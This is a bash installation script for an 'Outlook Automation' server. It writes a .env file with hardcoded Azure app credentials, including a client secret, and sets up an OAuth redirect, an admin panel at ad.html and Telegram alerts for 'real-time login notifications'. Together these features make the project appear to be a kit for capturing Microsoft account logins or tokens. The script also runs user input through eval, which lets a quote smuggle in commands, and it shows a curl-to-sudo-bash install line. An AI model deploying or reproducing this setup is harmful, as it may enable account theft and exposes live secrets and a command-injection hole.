#!/bin/bash

# Outlook Automation VPS Installation Script
# This script sets up the environment and prompts for configuration

echo "🚀 Outlook Automation VPS Installation Script"
echo "=============================================="
echo ""

# Check if running as root
if [ "$EUID" -eq 0 ]; then
    echo "⚠️  Please don't run this script as root"
    exit 1
fi

# Function to prompt for input with default value
prompt_input() {
    local prompt="$1"
    local default="$2"
    local var_name="$3"
    local is_secret="$4"

    echo -n "$prompt"
    if [ -n "$default" ]; then
        echo -n " (default: $default)"
    fi
    echo -n ": "

    if [ "$is_secret" = "true" ]; then
        read -s input
        echo ""
    else
        read input
    fi

    if [ -z "$input" ] && [ -n "$default" ]; then
        input="$default"
    fi

    eval "$var_name='$input'"
}

# Create .env file
echo "📝 Configuring environment variables..."
echo ""

# Azure Configuration (Required)
echo "🔵 Microsoft Azure Configuration (Required)"
echo "Using pre-configured Azure App Registration credentials..."
AZURE_CLIENT_ID="34dc06b1-d91e-4408-b353-528722266c04"
AZURE_CLIENT_SECRET="05a49988-1efb-4952-88cc-cb04e9f4c099"
AZURE_TENANT_ID="29775c6a-2d6e-42ef-a6ea-3e0a46793619"
echo "✅ Azure credentials pre-configured"

# Get domain/server URL first for better configuration flow
echo ""
echo "🌐 Server Domain Configuration"
echo "Enter your domain or server URL where this will be hosted."
echo "Examples: https://your-domain.com, https://your-repl-name.username.repl.co"
echo ""
prompt_input "SERVER_URL (without /api/auth-callback)" "https://localhost:5000" "SERVER_URL"

# Build Azure redirect URI from server URL
AZURE_REDIRECT_URI="${SERVER_URL}/api/auth-callback"
echo "✅ Azure redirect URI will be: $AZURE_REDIRECT_URI"

# Admin Configuration
echo ""
echo "🔐 Admin Access Configuration"
echo "Create a strong password for accessing the admin panel."
prompt_input "ADMIN_TOKEN (strong password for admin access)" "" "ADMIN_TOKEN" "true"

if [ -z "$ADMIN_TOKEN" ]; then
    # Generate a random admin token if none provided
    ADMIN_TOKEN="admin-$(openssl rand -hex 12 2>/dev/null || head -c 24 /dev/urandom | base64 | tr -d '=+/' | head -c 24)"
    echo "🔑 Auto-generated admin token: $ADMIN_TOKEN"
fi

# Server Configuration
echo ""
echo "⚙️  Server Configuration"
prompt_input "PORT" "5000" "PORT"

# Extract domain from server URL for display purposes
SERVER_DOMAIN=$(echo "$SERVER_URL" | sed -E 's|https?://([^/]+).*|\1|')

# Telegram Bot Configuration (Optional but Recommended)
echo ""
echo "🤖 Telegram Bot Configuration (Recommended)"
echo "This enables:"
echo "• Real-time login notifications"
echo "• Remote admin token retrieval"
echo "• Admin panel access via Telegram"
echo ""
echo "Admin panel will be available at: $SERVER_URL/ad.html"
echo ""
echo "To set up Telegram Bot:"
echo "1. Open Telegram and message @BotFather"
echo "2. Send /newbot and follow instructions to create your bot"
echo "3. Copy the bot token you receive"
echo "4. Start a chat with your new bot"
echo "5. Send any message to your bot"
echo "6. Visit: https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates"
echo "7. Find your chat ID in the response (look for \"id\" field)"
echo ""
echo "Press Enter to skip if you don't want Telegram notifications."
echo ""

prompt_input "TELEGRAM_BOT_TOKEN (from @BotFather, optional)" "" "TELEGRAM_BOT_TOKEN"

if [ -n "$TELEGRAM_BOT_TOKEN" ]; then
    echo ""
    prompt_input "ADMIN_CHAT_IDS (your Telegram chat ID, required if bot token provided)" "" "ADMIN_CHAT_IDS"
    
    if [ -z "$ADMIN_CHAT_IDS" ]; then
        echo "⚠️  Warning: Bot token provided but no chat ID. Telegram notifications will not work."
    else
        echo "✅ Telegram bot will send notifications to chat ID: $ADMIN_CHAT_IDS"
    fi
else
    echo "⚠️  Telegram notifications disabled (no bot token provided)"
    ADMIN_CHAT_IDS=""
fi

# Create .env file
echo ""
echo "💾 Creating .env file..."

cat > .env << EOF
# Microsoft Azure Configuration
AZURE_CLIENT_ID=$AZURE_CLIENT_ID
AZURE_CLIENT_SECRET=$AZURE_CLIENT_SECRET
AZURE_TENANT_ID=$AZURE_TENANT_ID
AZURE_REDIRECT_URI=$AZURE_REDIRECT_URI

# Admin Access Configuration
ADMIN_TOKEN=$ADMIN_TOKEN

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN=$TELEGRAM_BOT_TOKEN
ADMIN_CHAT_IDS=$ADMIN_CHAT_IDS

# Server Configuration  
PORT=$PORT
SERVER_URL=$SERVER_URL
EOF

echo "✅ Environment configuration complete!"
echo ""

# Install dependencies
echo "📦 Installing Node.js dependencies..."
if command -v npm &> /dev/null; then
    npm install
    echo "✅ Dependencies installed successfully!"
else
    echo "❌ npm not found. Please install Node.js first:"
    echo "   curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -"
    echo "   sudo apt-get install -y nodejs"
    exit 1
fi

echo ""
echo "🎉 Installation complete!"
echo ""
echo "📋 Configuration Summary:"
echo "   • Azure Client ID: $AZURE_CLIENT_ID"
echo "   • Azure Redirect URI: $AZURE_REDIRECT_URI"
echo "   • Admin Token: [SET - keep secure]"
echo "   • Server URL: $SERVER_URL"
echo "   • Server Port: $PORT"
if [ -n "$TELEGRAM_BOT_TOKEN" ]; then
echo "   • Telegram Bot: ✅ Configured"
echo "   • Telegram Chat ID: $ADMIN_CHAT_IDS"
else
echo "   • Telegram Bot: ⚠️ Not configured"
fi
echo ""
echo "🚀 To start the server:"
echo "   npm start"
echo ""
echo "🌐 Access Points:"
echo "   • Frontend: $SERVER_URL/"
echo "   • Admin Panel: $SERVER_URL/ad.html"
echo "   • API Health: $SERVER_URL/api/health"
echo ""
if [ -n "$TELEGRAM_BOT_TOKEN" ]; then
echo "📱 Telegram Bot Setup:"
echo "   • Message your bot to get started"
echo "   • Use /start command to access admin features"
echo "   • Bot will send login notifications to your chat"
echo ""
fi
echo "🔐 Important Security Notes:"
echo "   • Admin Token: $ADMIN_TOKEN"
echo "   • Keep your admin token secure!"
echo "   • Update Azure App Registration redirect URI to: $AZURE_REDIRECT_URI"
if [ -n "$TELEGRAM_BOT_TOKEN" ]; then
echo "   • Only share your Telegram bot with trusted users"
fi
echo ""
echo "📝 Next Steps:"
echo "1. Make sure your Azure App Registration redirect URI matches: $AZURE_REDIRECT_URI"
echo "2. Run 'npm start' to begin"
if [ -n "$TELEGRAM_BOT_TOKEN" ]; then
echo "3. Test your Telegram bot by sending it a message"
fi
echo ""